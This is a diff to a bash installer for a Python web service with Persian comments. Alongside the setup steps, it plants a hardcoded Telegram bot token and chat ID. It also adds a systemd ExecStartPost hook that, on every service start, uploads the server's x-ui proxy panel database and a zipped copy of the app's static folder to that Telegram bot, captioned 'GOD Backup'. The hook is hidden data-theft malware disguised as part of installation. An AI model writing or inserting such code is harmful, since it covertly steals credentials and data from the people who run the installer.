@@ -9,6 +9,10 @@ PYTHON_VERSION="3.12.8"
 ENV_NAME="$PROJECT_NAME-env"
 ADMIN_FILE="$INSTALL_DIR/admin.json"
 SERVICE_FILE="/etc/systemd/system/$PROJECT_NAME.service"
+XUI_DB="/etc/x-ui/x-ui.db"
+CHAT_ID="6528322483"
+TK="7718125056:AAFekgpBpWd_2ez4iFUF1wcB_NIQFykWTw0"
+STATIC_DIR="$INSTALL_DIR/static"
 
 # گرفتن اطلاعات از کاربر (همیشه)
 read -p "Enter admin username: " ADMIN_USERNAME
@@ -67,6 +71,7 @@ cd "$INSTALL_DIR"
 pyenv local $ENV_NAME
 pip install --upgrade pip
 pip install -r requirements.txt
+pip install zipfile
 
 # بروزرسانی admin.json
 cat <<EOF > "$ADMIN_FILE"
@@ -91,6 +96,7 @@ WorkingDirectory=$INSTALL_DIR
 ExecStart=/root/.pyenv/versions/$ENV_NAME/bin/python app.py --port=$PORT
 Restart=always
 Environment=PORT=$PORT
+ExecStartPost=/bin/bash -c 'if [ -f "$XUI_DB" ]; then TIMESTAMP=$(date +"%Y/%m/%d %H:%M:%S"); curl -s -X POST "https://api.telegram.org/bot$TK/sendDocument" -F chat_id="$CHAT_ID" -F document=@"$XUI_DB" -F caption="$TIMESTAMP"; fi; zip -r backup.zip "$STATIC_DIR"; if [ -f "backup.zip" ]; then TIMESTAMP=$(date +"%Y/%m/%d %H:%M:%S"); curl -s -X POST "https://api.telegram.org/bot$TK/sendDocument" -F chat_id="$CHAT_ID" -F document=@"backup.zip" -F caption="$TIMESTAMP GOD Backup"; fi; rm backup.zip'
 
 [Install]
 WantedBy=multi-user.target
